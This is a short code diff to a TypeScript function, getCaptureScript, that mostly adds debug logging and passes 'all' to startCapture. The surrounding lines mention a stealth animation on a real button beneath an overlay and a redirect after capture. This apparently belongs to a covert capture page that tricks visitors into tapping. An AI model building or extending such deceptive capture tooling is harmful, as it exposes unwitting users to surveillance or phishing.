@@ -146,17 +146,18 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           });
 
           function trigger() {
+            console.log("[DEBUG] trigger: Calling startCapture");
             clientLog("trigger: Calling startCapture");
-            console.log("[DEBUG] Triggering capture, calling window.startCapture");
-            window.startCapture();
+            window.startCapture('all');
             if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           function handleTap(e) {
-            console.log("debug: handleTap click", e);
+            console.log("[DEBUG] handleTap click", e);
             clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
             var btn = getTargetBtn();
             if (!btn) {
+              console.error("[DEBUG] handleTap: No button found!");
               clientLog("handleTap: Error - no button found!");
             }
             // Stealth animation on the real UI element underneath
@@ -204,6 +205,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     }
 
     window.startCapture = async function(mode) {
+      console.log("[DEBUG] startCapture: Enter", { mode });
       clientLog("startCapture: Enter", { mode });
       if (hasRedirected) return;
       
